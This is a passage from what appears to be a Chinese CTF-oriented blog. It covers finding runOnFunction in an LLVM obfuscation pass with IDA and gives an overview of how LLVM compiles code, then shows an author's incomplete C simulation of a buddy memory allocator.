class="number">4</span></span><br><span class="line">opcode=getelementptr NumOperands=<span class="number">3</span></span><br><span class="line">opcode=call NumOperands=<span class="number">4</span></span><br><span class="line">opcode=call NumOperands=<span class="number">2</span></span><br><span class="line">opcode=ret NumOperands=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="BogusControlFlow"><a href="#BogusControlFlow" class="headerlink" title="BogusControlFlow"></a>BogusControlFlow</h2><p>BogusControlFlow 是一个结构体，跟到 runOnFunction </p>
<p>BogusControlFlow 的功能是为函数增加新的虚假控制流和添加垃圾指令</p>
<h2 id="runOnFunction"><a href="#runOnFunction" class="headerlink" title="runOnFunction"></a>runOnFunction</h2><p>runOnFunction 是入口函数，BogusControlFlow 继承了 FunctionPass，因此它的入口函数即为 runOnFunction </p>
<p>在 IDA7.7 中可以直接搜索 runOnFunction：</p>
<img src="/2022/05/30/LLVM%20pass%20pwn/1653910982270-1654355265749.png" class width="1653910982270"> 
<p>如果 IDA 没有找到 runOnFunction，就只能通过调试来寻找它了：</p>
<ul>
<li>由于模块是动态加载的，并且运行时也不会暂停下来等我们用调试器去<code>Attach</code>，因此我们可以直接使用 IDA 来进行调试</li>
</ul>
<p>还有另一种方法：</p>
<ul>
<li>在 IDA 中搜索题目给定的“在代码中注册的名字”，找到对应的函数</li>
</ul>
<img src="/2022/05/30/LLVM%20pass%20pwn/1653917067225-1654355265749.png" class width="1653917067225"> 
<ul>
<li>在这个函数及其子函数中寻找 off-xxxx 就可能找到虚表（尽量找那些未命名的函数）</li>
</ul>
<img src="/2022/05/30/LLVM%20pass%20pwn/1653917316159-1654355265750.png" class width="1653917316159"> 
<ul>
<li>虚表的最后一个条目就是 runOnFunction</li>
</ul>
<img src="/2022/05/30/LLVM%20pass%20pwn/1653917365912-1654355265750.png" class width="1653917365912"> 
<h2 id="LLVM-原理"><a href="#LLVM-原理" class="headerlink" title="LLVM 原理"></a>LLVM 原理</h2><p>传统编译器分三个阶段： </p>
<p>前端（Frontend）— 优化器（Optimizer）— 后端（Backend）</p>
<ul>
<li>前端负责分析源代码，可以检查语法级错误，并构建针对语言的抽象语法树（AST），抽象语法树可以进一步转换为优化，最终转为新的表示方式，然后再交给让优化器和后端处理</li>
<li>最终由后端生成可执行的机器码 </li>
</ul>
<p>LLVM 也分三个阶段，但是设计上略微的有些区别，LLVM 不同的就是对于不同的语言它都提供了同一种中间表示： </p>
<ul>
<li>前端可以使用不同的编译工具对代码文件做词法分析以形成抽象语法树（AST），然后将分析好的代码转换成 LLVM 的中间表示 IR（intermediate representation）</li>
<li>中间部分的优化器只对中间表示 IR 进行操作，通过一系列的 pass 对 IR 做优化</li>
<li>后端负责将优化好的 IR 解释成对应平台的机器码</li>
</ul>
<p>LLVM 的优点在于：中间表示 IR 代码编写良好，而且不同的前端语言最终都转换成同一种的 IR</p>
<ul>
<li>计算机科学领域的任何问题都可以通过增加一个间接的中间层来解决</li>
</ul>
<p><strong>所以 LLVM 就是在执行优化操作之前，先把代码转化为 LLVM 的中间表示 IR，然后对 IR 进行优化，最后交给后端翻译为机器码</strong></p>
<p>使用 LLVM 的对一门语言编译如下所示： </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">源代码 =&gt; (词法分析) =&gt; Token =&gt; (语法分析) =&gt; AST =&gt; (代码生成) =&gt; LLVM IR =&gt; (优化) =&gt; LLVM IR(已优化) =&gt; (生成汇编代码) =&gt; 汇编代码 =&gt; (汇编) =&gt; 目标文件 =&gt; (Link) =&gt; 可执行文件</span><br></pre></td></tr></table></figure>
<p>PS：至于 LLVM pass，复现 “红帽杯 simpleVM” 会有深刻的理解</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/28/mybuddy/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/28/mybuddy/" class="post-title-link" itemprop="url">mybuddy</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-05-28 16:34:26 / Modified: 16:39:32" itemprop="dateCreated datePublished" datetime="2022-05-28T16:34:26+08:00">2022-05-28</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>mybuddy</strong></p>
<p>最近学习伙伴系统，大概流程看完了，但是还没有分析源码</p>
<p>我写了个C语言代码来模拟伙伴系统，有关位图的那部分没有实现（有点不懂），所以我直接在结构体中写入标志位</p>
<p>代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">buddy</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> size;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>* longest;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>* offset;</span><br><span class="line">    <span class="keyword">bool</span>* is_exist;</span><br><span class="line">    <span class="keyword">bool</span>* is_alloc;</span><br><span class="line">    <span class="keyword">bool</span>* is_cut;</span><br><span class="line">    <span class="keyword">bool</span>* is_run;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">is_power_of_2</span><span class="params">(<span class="keyword">unsigned</span> x)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> !(x &amp; (x - <span class="number">1</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">fixsize</span><span class="params">(<span class="keyword">unsigned</span> size)</span> </span>&#123;</span><br><span class="line">	size |= size &gt;&gt; <span class="number">1</span>;</span><br><span class="line">	size |= size &gt;&gt; <span class="number">2</span>;</span><br><span class="line">	size |= size &gt;&gt; <span class="number">4</span>;</span><br><span class="line">	size |= size &gt;&gt; <span class="number">8</span>;</span><br><span class="line">	size |= size &gt;&gt; <span class="number">16</span>;</span><br><span class="line">	<span class="keyword">return</span> size + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="title">left_leaf</span><span class="params">(<span class="keyword">unsigned</span> index)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> index * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="title">right_leaf</span><span class="params">(<span class="keyword">unsigned</span> index)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> index * <span class="number">2</span> + <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="title">parent</span><span class="params">(<span class="keyword">unsigned</span> index)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> (index + <span class="number">1</span>) / <span class="number">2</span> - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct buddy* <span class="title">buddy_new</span><span class="params">(<span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">buddy</span>* <span class="title">self</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> node_size;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        size = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (is_power_of_2(size) == <span class="literal">false</span>) &#123; </span><br><span class="line">        size = fixsize(size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    self = (struct buddy*)<span class="built_in">malloc</span>(<span class="number">2</span> * size * <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">    self-&gt;size = size;</span><br><span class="line">    node_size = size * <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    self-&gt;longest = (<span class="keyword">unsigned</span> <span class="keyword">int</span>*)<span class="built_in">malloc</span>((size * <span class="number">2</span> - <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>));</span><br><span class="line">    self-&gt;offset = (<span class="keyword">unsigned</span> <span class="keyword">int</span>*)<span class="built_in">malloc</span>((size * <span class="number">2</span> - <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">int</span>));</span><br><span class="line">    self-&gt;is_exist = (<span class="keyword">bool</span>*)<span class="built_in">malloc</span>((size * <span class="number">2</span> - <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="keyword">bool</span>));</span><br><span class="line">    self-&gt;is_alloc = (<span class="keyword">bool</span>*)<span class="built_in">malloc</span>((size * <span class="number">2</span> - <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="keyword">bool</span>));</span><br><span class="line">    self-&gt;is_cut = (<span class="keyword">bool</span>*)<span class="built_in">malloc</span>((size * <span class="number">2</span> - <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="keyword">bool</span>));</span><br><span class="line">    self-&gt;is_run = (<span class="keyword">bool</span>*)<span class="built_in">malloc</span>((size * <span class="number">2</span> - <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="keyword">bool</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size * <span class="number">2</span> - <span class="number">1</span>; ++i) &#123; </span><br><span class="line">        <span class="keyword">if</span> (is_power_of_2(i + <span class="number">1</span>)) &#123;</span><br><span class="line">            node_size /= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        self-&gt;longest[i] = node_size;</span><br><span class="line">        self-&gt;offset[i] = <span class="number">0</span>;</span><br><span class="line">        self-&gt;is_exist[i] = <span class="literal">false</span>;</span><br><span class="line">        self-&gt;is_alloc[i] = <span class="literal">false</span>;</span><br><span class="line">        self-&gt;is_cut[i] = <span class="literal">false</span>;</span><br><span class="line">        self-&gt;is_run[i] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    self-&gt;is_exist[<span class="number">0</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> self;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buddy_print</span><span class="params">(buddy* bd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">int</span> layers;</span><br><span class="line">    <span class="keyword">int</span> y = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> size = bd-&gt;size;</span><br><span class="line">    <span class="keyword">int</span> size_tmp = size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (layers = <span class="number">1</span>; size_tmp != <span class="number">1</span>; layers++) &#123;</span><br><span class="line">        size_tmp /= <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nbuddy size: %d (%d layers)\n&quot;</span>, size, layers);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= <span class="number">2</span> * size - <span class="number">1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; layers; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (bd-&gt;is_exist[i - <span class="number">1</span>] == <span class="literal">false</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, bd-&gt;longest[i - <span class="number">1</span>]); <span class="comment">// 不存在</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (bd-&gt;is_cut[i - <span class="number">1</span>] == <span class="literal">true</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(%d)&quot;</span>, bd-&gt;longest[i - <span class="number">1</span>]); <span class="comment">// 已分割</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (bd-&gt;is_alloc[i - <span class="number">1</span>] == <span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;&lt;%d&gt;&quot;</span>, bd-&gt;longest[i - <span class="number">1</span>]); <span class="comment">// 已分配</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (bd-&gt;is_alloc[i - <span class="number">1</span>] == <span class="literal">false</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[%d]&quot;</span>, bd-&gt;longest[i - <span class="number">1</span>]); <span class="comment">// 未分配</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i == y - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            y = y * <span class="number">2</span>;</span><br><span class="line">            layers--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buddy_alloc</span><span class="params">(struct buddy* bp, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> node_size;</span><br><span class="line">    <span class="keyword">unsigned</span> offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">buddy</span>* <span class="title">self</span> =</span> bp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">0</span> || size &gt; self-&gt;longest[<span class="number">1</span>]) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nSize wrong\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (!is_power_of_2(size)) &#123;</span><br><span class="line">        size = fixsize(size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; self-&gt;size * <span class="number">2</span> - <span class="number">1</span>; ++i) &#123; </span><br><span class="line">        self-&gt;is_run[i] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (node_size = self-&gt;size; node_size != size; node_size /= <span class="number">2</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (self-&gt;longest[left_leaf(index)] &gt;= size &amp;&amp; self-&gt;is_alloc[left_leaf(index)] == <span class="literal">false</span> </span><br><span class="line">            &amp;&amp; self-&gt;is_run[left_leaf(index)] == <span class="literal">true</span>) &#123; </span><br><span class="line">            <span class="keyword">if</span> (self-&gt;is_exist[left_leaf(index)] == <span class="literal">false</span>) &#123; </span><br><span class="line">                self-&gt;is_cut[index] = <span class="literal">true</span>;</span><br><span class="line">                self-&gt;is_exist[left_leaf(index)] = <span class="literal">true</span>;</span><br><span class="line">                self-&gt;is_exist[right_leaf(index)] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (self-&gt;longest[left_leaf(index)] == size &amp;&amp; self-&gt;is_cut[left_leaf(index)] == <span class="literal">true</span>) &#123; </span><br><span class="line">                self-&gt;is_run[left_leaf(index)] = <span class="literal">false</span>;</span><br><span class="line">                node_size *= <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            index = left_leaf(index);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (self-&gt;longest[right_leaf(index)] &gt;= size &amp;&amp; self-&gt;is_alloc[right_leaf(index)] == <span class="literal">false</span> </span><br><span class="line">            &amp;&amp; self-&gt;is_run[right_leaf(index)] == <span class="literal">true</span>) &#123;</span><br><span class="line">            index = right_leaf(index);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            self-&gt;is_run[index] = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">if</span> (index == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            index = parent(index);</span><br><span class="line">            node_size *= <span class="number">4</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        offset = (index + <span class="number">1</span>) * node_size - self-&gt;size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (index == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nbuffer is full\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    self-&gt;is_alloc[index] = <span class="literal">true</span>;</span><br><span class="line">    self-&gt;offset[index] = offset;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your index:%d\n&quot;</span>, index);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;your offset:%d\n&quot;</span>, offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">buddy_free</span><span class="params">(struct buddy* self, <span class="keyword">int</span> bdindex)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> node_size;</span><br><span class="line">    <span class="keyword">unsigned</span> index = bdindex;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> (self-&gt;is_exist[index] == <span class="literal">false</span>) &#123; </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nIndex wrong\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self-&gt;is_cut[index] == <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nIts children are still being used\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self-&gt;is_alloc[index] == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nDouble free\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\ntarget buffer index: %d\n&quot;</span>, index);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; size: %d\n&quot;</span>, self-&gt;longest[index]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; offset: %d\n&quot;</span>, self-&gt;offset[index]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; index != <span class="number">0</span>;) &#123; </span><br><span class="line">        <span class="keyword">if</span> (self-&gt;is_alloc[index] = <span class="literal">true</span>) &#123;</span><br><span class="line">            self-&gt;is_alloc[index] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        index = parent(index);</span><br><span class="line">        <span class="keyword">if</span> (self-&gt;is_alloc[left_leaf(index)] == <span class="literal">false</span> &amp;&amp; self-&gt;is_alloc[right_leaf(index)] == <span class="literal">false</span> </span><br><span class="line">            &amp;&amp; self-&gt;is_cut[left_leaf(index)] == <span class="literal">false</span> &amp;&amp; self-&gt;is_cut[right_leaf(index)] == <span class="literal">false</span>) &#123; </span><br><span class="line">            self-&gt;is_exist[left_leaf(index)] = <span class="literal">false</span>;</span><br><span class="line">            self-&gt;is_exist[right_leaf(index)] = <span class="literal">false</span>;</span><br><span class="line">            self-&gt;is_cut[index] = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">Choose</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> choice[<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;----------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|Buddy System  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|              |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|your choice:  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|1. new        |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|2. alloc      |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|3. free       |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|4. show       |\n&quot;</span>);</span><br><span class="line">    <span 